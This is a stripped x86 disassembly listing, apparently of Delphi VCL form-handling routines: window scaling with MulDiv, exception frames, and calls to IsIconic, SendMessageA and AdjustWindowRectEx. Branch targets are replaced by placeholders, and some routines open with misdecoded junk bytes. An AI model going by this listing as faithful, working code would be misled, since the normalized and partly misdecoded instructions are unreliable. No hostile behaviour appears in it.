mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45f278
mov ecx edi
mov edx esi
mov eax ebx
call sub_44cb60
pop edi
pop esi
pop ebx
retn
sub_45f344
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_45f3ae
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b640
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f3b5
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_45f3b5
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_45f3ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45ef94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f3f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_45f3f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f014
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_45f468
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4461ac
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4295f4
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_446168
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4295f4
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_416f3c
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4490c0
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45f4d8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45f539
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44c3d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f540
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_45f568
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45ed38
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_445f20
mov edx 0x29
mov eax esi
call sub_445f44
mov [ esi + 0x220 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_45f5c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45edec
xor eax eax
mov al [ ebx + 0x220 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_45f634
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c66c
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x1
jne r-xdata
mov eax ebx
call sub_44a5f4
sub_45f660
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45f7c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_45f7a4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4031b8
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4035bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f7ab
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_45f76c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_418184
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031c0
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
sub_45f7ec
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40346c
and [ ebx + 0x2f4 ] 0xdf
sub_45f824
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45ed38
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_445ed4
xor edx edx
mov eax ebx
call sub_445ef8
mov edx 0x140
mov eax ebx
call sub_445f20
mov edx 0xf0
mov eax ebx
call sub_445f44
mov dl 0x1
mov eax [ r-xdata ]
call sub_428b88
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_460140
mov dl 0x1
mov eax [ r-xdata ]
call sub_424234
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_445340
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4031b8
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_4604a4
xor edx edx
mov eax ebx
call sub_446928
xor edx edx
mov eax ebx
call sub_446890
mov dl 0x1
mov eax ebx
call sub_44d194
mov edx ebx
mov eax [ rw-data ]
call sub_464b08
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_45f99d
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_420b0c
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_4186ec
xor edx edx
mov eax ebx
call sub_41b93c
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_4639b0
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_45fa08
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403624
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_45fad2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46232c
mov eax [ ebp - 0x4 ]
call sub_44d358
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_464b40
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403270
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403270
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40cf90
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_45edb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fad9
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_45faec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_45fb2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4604a4
sub_45fb32
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_40346c
test al al
jne r-xdata
call sub_403aa0
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403a4c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4604a4
sub_45fb68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_45fba9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45fbc8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_448814
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_40346c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_461e70
sub_45fc04
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_445c34
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_4183f4
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_461268
mov edx esi
mov eax ebp
call sub_4186ec
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_461240
mov edx esi
mov eax edi
call sub_461268
jmp r-xdata
xor edx edx
mov eax edi
call sub_46121c
sub_45fd10
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4498ec
xor edx edx
push ebp
push sub_45ff66
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_449048
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_446180
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4461c4
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_460098
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44790c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ff6d
mov eax [ ebp - 0x4 ]
call sub_4498f4
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45f278
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44cb18
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45f278
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44cb18
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_423af8
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_423b00
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_45ff75
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a394
push 0x0
push 0x0
push ebx
push sub_46007c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_460048
push ebx
push sub_460060
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_460027
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c034
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_446890
sub_4600b3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45f278
mov ecx edi
mov edx esi
mov eax ebx
call sub_44cb18
mov eax ebx
call sub_46019c
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_423b9c
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_423bb8
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4461ac
mov ebp eax
push edi
push esi
mov eax ebx
call sub_446168
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_460444
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_460474
sub_460140
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_44d054
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_44d358
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_4624a0
push eax
push 0x1
push 0x80
mov eax ebx
call sub_44d054
push eax
call SendMessageA
pop ebx
retn
sub_4601d4
push ebx
mov ebx eax
mov eax ebx
call sub_4610f0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_460268
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d054
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44d11c
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_44d054
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_44d054
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_4602f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_44d5f8
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_420e90
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420e64
mov edi eax
mov eax edi
mov si 0xfff1
call sub_40346c
test al al
jne r-xdata
sub_46035c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4031b8
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_460388
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebp
call sub_449d84
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_420e90
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_44d640
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_420e64
mov si 0xfff1
call sub_40346c
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_420ea0
jmp r-xdata
sub_46041c
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44694c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44790c
sub_460444
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_446180
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_460474
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_4461c4
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_4604a4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_446684
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_4615dc
pop esi
pop ebx
retn
sub_4604e8
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_460541
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460548
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
sub_460550
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_446638
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_44a5ac
mov eax ebx
call sub_44a748
sub_460588
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_420cdc
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_4605c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44aa68
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_40346c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_40346c
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_44790c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_44790c
